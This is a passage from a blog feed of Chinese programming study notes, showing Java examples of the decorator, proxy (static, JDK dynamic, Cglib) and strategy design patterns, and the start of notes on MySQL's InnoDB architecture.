class="keyword">return</span> <span class="keyword">super</span>.getPrice();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LongBlack类  继承Cof类  使用超类的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongBlack</span> <span class="keyword">extends</span> <span class="title">Coffee</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LongBlack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setDes(<span class="string">&quot; longblack &quot;</span>);</span><br><span class="line">setPrice(<span class="number">5.0f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>装饰类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Decorator</span> <span class="keyword">extends</span> <span class="title">Drink</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> Drink obj;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Decorator</span><span class="params">(Drink obj)</span> </span>&#123; <span class="comment">//组合</span></span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line"><span class="keyword">this</span>.obj = obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">// getPrice 自己价格</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.getPrice() + obj.cost();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDes</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">// obj.getDes() 输出被装饰者的信息</span></span><br><span class="line"><span class="keyword">return</span> des + <span class="string">&quot; &quot;</span> + getPrice() + <span class="string">&quot; &amp;&amp; &quot;</span> + obj.getDes();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Milk类 继承装饰类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Milk</span> <span class="keyword">extends</span> <span class="title">Decorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Milk</span><span class="params">(Drink obj)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(obj);</span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">setDes(<span class="string">&quot; 牛奶 &quot;</span>);</span><br><span class="line">setPrice(<span class="number">2.0f</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>装饰者模式在JDK应用的源码分析</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015103834.png"></p><p>这里的FilterInputStream就是一个装饰者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">InputStream</span> <span class="keyword">implements</span> <span class="title">Closeable</span></span>&#123;&#125; <span class="comment">//是一个抽象类，即Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterInputStream</span> <span class="keyword">extends</span> <span class="title">InputStream</span> </span>&#123; <span class="comment">//是一个装饰者类Decorator</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">volatile</span> InputStream in <span class="comment">//被装饰的对象 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、行为型模式"><a href="#3、行为型模式" class="headerlink" title="3、行为型模式"></a>3、行为型模式</h3><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><ol><li><p>为一个对象提供一个替身，以控制这个对象的访问。即通过代理对象访问目标对象，这样的好处是：</p><p>可以在目标对象实现的基础上，增强额外的功能操作，即扩展目标对象的功能。</p></li><li><p>被代理的对象可以是远程对象，创建开销大的对象或需要安全控制的对象。</p></li><li><p>代理的形式有三种：</p><ol><li>静态代理</li><li>动态代理（JDK代理、接口代理）</li><li>Cglib代理（可以在内存动态的创建对象，而不需要实现接口，他是属于动态代理的范畴）</li></ol></li></ol><h5 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h5><p>在使用时，需要定义接口或者父类，被代理对象（即目标对象）与代理对象一起实现相同的接口或者是继承相同父类</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211019150046.png"></p><p>在我看来，就是让代理对象与被代理对象同时继承接口，然后代理对象在成员变量里聚合被代理对象，调用被代理对象执行方法。</p><p>代理接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ITeacherDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">teach</span><span class="params">()</span></span>; <span class="comment">// 授课的方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理目标</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TeacherDao</span> <span class="keyword">implements</span> <span class="title">ITeacherDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">teach</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; 老师授课中  。。。。。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代理对象,静态代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TeacherDaoProxy</span> <span class="keyword">implements</span> <span class="title">ITeacherDao</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ITeacherDao target; <span class="comment">// 目标对象，通过接口来聚合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TeacherDaoProxy</span><span class="params">(ITeacherDao target)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.target = target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">teach</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot;开始代理  完成某些操作。。。。。 &quot;</span>);<span class="comment">//方法</span></span><br><span class="line">target.teach();</span><br><span class="line">System.out.println(<span class="string">&quot;提交。。。。。&quot;</span>);<span class="comment">//方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">//创建目标对象(被代理对象)</span></span><br><span class="line">TeacherDao teacherDao = <span class="keyword">new</span> TeacherDao();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建代理对象, 同时将被代理对象传递给代理对象</span></span><br><span class="line">TeacherDaoProxy teacherDaoProxy = <span class="keyword">new</span> TeacherDaoProxy(teacherDao);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过代理对象，调用到被代理对象的方法</span></span><br><span class="line"><span class="comment">//即：执行的是代理对象的方法，代理对象再去调用目标对象的方法 </span></span><br><span class="line">teacherDaoProxy.teach();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>优点：在不修改目标对象的功能前提下，能通过代理对象对目标功能扩展。</p><p>缺点：因为代理对象需要与目标对象实现一样的接口，所以会有很多代理类</p><p>一旦增加接口方法，目标对象与代理对象都要维护。</p><h5 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h5><ol><li>代理对象不需要实现接口，目标对象需要实现接口，否则不能使用</li><li>代理对象的生成，是利用JDK的API，动态的在内存中构建代理对象。</li><li>动态代理也叫JDK代理，接口代理。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211019153257.png"></p><p>在我看来，这个无非就是利用jdk的api，然后能够通过传入一个目标对象，动态的在内存中创建出代理对象，并在匿名内部类的事件对象里增强方法。</p><p>代理接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ITeacherDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">teach</span><span class="params">()</span></span>; <span class="comment">// 授课方法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目标对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TeacherDao</span> <span class="keyword">implements</span> <span class="title">ITeacherDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">teach</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; 老师授课中.... &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot;hello &quot;</span> + name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理工厂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//维护一个目标对象 , Object</span></span><br><span class="line"><span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器 ， 对target 进行初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProxyFactory</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.target = target;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//给目标对象 生成一个代理对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProxyInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//说明</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  public static Object newProxyInstance(ClassLoader loader,</span></span><br><span class="line"><span class="comment">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="comment">                                          InvocationHandler h)</span></span><br><span class="line"><span class="comment">                                          </span></span><br><span class="line"><span class="comment">            //1. ClassLoader loader ： 指定当前目标对象使用的类加载器, 获取加载器的方法固定</span></span><br><span class="line"><span class="comment">            //2. Class&lt;?&gt;[] interfaces: 目标对象实现的接口类型，使用泛型方法确认类型</span></span><br><span class="line"><span class="comment">            //3. InvocationHandler h : 事情处理，执行目标对象的方法时，会触发事情处理器方法, 会把当前执行的目标对象方法作为参数传入</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), </span><br><span class="line">target.getClass().getInterfaces(), </span><br><span class="line"><span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot;JDK代理开始~~&quot;</span>);</span><br><span class="line"><span class="comment">//反射机制调用目标对象的方法</span></span><br><span class="line">Object returnVal = method.invoke(target, args);</span><br><span class="line">System.out.println(<span class="string">&quot;JDK代理提交&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> returnVal;</span><br><span class="line">&#125;</span><br><span class="line">&#125;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">//创建目标对象</span></span><br><span class="line">ITeacherDao target = <span class="keyword">new</span> TeacherDao();</span><br><span class="line"></span><br><span class="line"><span class="comment">//给目标对象，创建代理对象, 可以转成 ITeacherDao</span></span><br><span class="line">ITeacherDao proxyInstance = (ITeacherDao)<span class="keyword">new</span> ProxyFactory(target).getProxyInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// proxyInstance=class com.sun.proxy.$Proxy0 内存中动态生成了代理对象</span></span><br><span class="line">System.out.println(<span class="string">&quot;proxyInstance=&quot;</span> + proxyInstance.getClass());</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过代理对象，调用目标对象的方法</span></span><br><span class="line"><span class="comment">//proxyInstance.teach();</span></span><br><span class="line"></span><br><span class="line">proxyInstance.sayHello(<span class="string">&quot; tom &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Cglib代理"><a href="#Cglib代理" class="headerlink" title="Cglib代理"></a>Cglib代理</h5><p>有时目标对象只是一个单独的对象，并没有实现任何的接口，这个时候可使用目标对象子类来实现代理。</p><p>也叫做子类代理，它是在内存中构建一个子类对象从而实现对目标对象功能扩展。</p><p>Cglib包的底层是通过使用字节码处理框架ASM来转换字节码并生成新的类。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211019162904.png"></p><p>代理目标对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TeacherDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">teach</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot; 老师授课中  ， 我是cglib代理，不需要实现接口 &quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//维护一个目标对象</span></span><br><span class="line"><span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器，传入一个被代理的对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProxyFactory</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.target = target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个代理对象:  是 target 对象的代理对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProxyInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//1. 创建一个工具类</span></span><br><span class="line">Enhancer enhancer = <span class="keyword">new</span> Enhancer();</span><br><span class="line"><span class="comment">//2. 设置父类</span></span><br><span class="line">enhancer.setSuperclass(target.getClass());</span><br><span class="line"><span class="comment">//3. 设置回调函数</span></span><br><span class="line">enhancer.setCallback(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//4. 创建子类对象，即代理对象</span></span><br><span class="line"><span class="keyword">return</span> enhancer.create();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写  intercept 方法，会调用目标对象的方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object arg0, Method method, Object[] args, MethodProxy arg3)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot;Cglib代理模式 ~~ 开始&quot;</span>);</span><br><span class="line">Object returnVal = method.invoke(target, args);</span><br><span class="line">System.out.println(<span class="string">&quot;Cglib代理模式 ~~ 提交&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> returnVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">//创建目标对象</span></span><br><span class="line">TeacherDao target = <span class="keyword">new</span> TeacherDao();</span><br><span class="line"><span class="comment">//获取到代理对象，并且将目标对象传递给代理对象</span></span><br><span class="line">TeacherDao proxyInstance = (TeacherDao)<span class="keyword">new</span> ProxyFactory(target).getProxyInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行代理对象的方法，触发intecept 方法，从而实现 对目标对象的调用</span></span><br><span class="line">String res = proxyInstance.teach();</span><br><span class="line">System.out.println(<span class="string">&quot;res=&quot;</span> + res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h4><p>策略模式中，定义算法组，分别封装起来，让他们之间相互替换，此模式让算法的变化独立于使用算法的客户。</p><p>体现几个原则：</p><ol><li>把变化的代码从不变的代码中分离出来。</li><li>针对接口编程而不是具体类。</li><li>多用组合/聚合，少用继承（客户会通过组合方式使用策略）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015105854.png"></p><p>客户context 有成员变量strategy或者其他的策略接口 ,至于需要使用到哪个策略，我们可以在构造器中指定。</p><p><strong>策略模式的关键是：</strong></p><p>项目中的变化部分与不变部分</p><p><strong>核心思想是：</strong></p><p>多用组合/聚合，少用继承；用行为类组合，而不是行为的继承。更有弹性。</p><p>体现了“对修改关闭，对扩展开放”原则，客户端不用增加行为不用修改原有代码，只要添加一种策略即可。避免了使用多重转移语句。</p><p><strong>缺陷：</strong></p><p>每添加一个策略就要添加一个类，当策略过多会导致类数目庞大。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;设计模式&quot;&gt;&lt;a href=&quot;#设计模式&quot; class=&quot;headerlink&quot; title=&quot;设计模式&quot;&gt;&lt;/a&gt;设计模式&lt;/h1&gt;&lt;p&gt;设计模式的目的：&lt;/p&gt;
&lt;p&gt;解决耦合性，内聚性，可维护性，重用性，灵活性等问题&lt;/p&gt;
&lt;h2 id=&quot;设计原则&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="设计模式" scheme="https://a2914475618.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Mysql技术引擎</title>
    <link href="https://a2914475618.github.io/2021/10/09/Mysql%E6%8A%80%E6%9C%AF%E5%BC%95%E6%93%8E/"/>
    <id>https://a2914475618.github.io/2021/10/09/Mysql%E6%8A%80%E6%9C%AF%E5%BC%95%E6%93%8E/</id>
    <published>2021-10-09T05:54:30.000Z</published>
    <updated>2021-11-23T13:31:55.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mysql技术"><a href="#Mysql技术" class="headerlink" title="Mysql技术"></a>Mysql技术</h1><blockquote><p>声明：该文章为我学习Mysql技术引擎Innodb的笔记，欢迎查阅</p></blockquote><h2 id="1、Mysql体系结构和存储引擎"><a href="#1、Mysql体系结构和存储引擎" class="headerlink" title="1、Mysql体系结构和存储引擎"></a>1、Mysql体系结构和存储引擎</h2><h3 id="数据库和实例"><a href="#数据库和实例" class="headerlink" title="数据库和实例"></a>数据库和实例</h3><p>数据库：物理操作系统文件或其他形式文件类型的集合。数据库文件可以是frm、MYD、MYI、ibd结尾的文件。</p><p>实例：Mysql数据库由由后台线程以及一个共享内存区组成。共享内存可以被运行的后台线程所共享。数据库实例才是真正用于操作数据库文件的。</p><p>两者关系：</p><p>一个实例对应一个数据库，一个数据库对应一个实例。</p><p>Mysql被设计为一个单进程多线程的数据库，Mysql数据库实例在系统上的表现就是一个进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Linux通过命令ps观察数据库启动后的进程情况</span><br><span class="line">ps -ef | grep mysqlId</span><br><span class="line">&#x2F;&#x2F;Mysql数据库实例启动后，会在哪些位置查看配置文件</span><br><span class="line">mysql --help |grep my.cnf</span><br><span 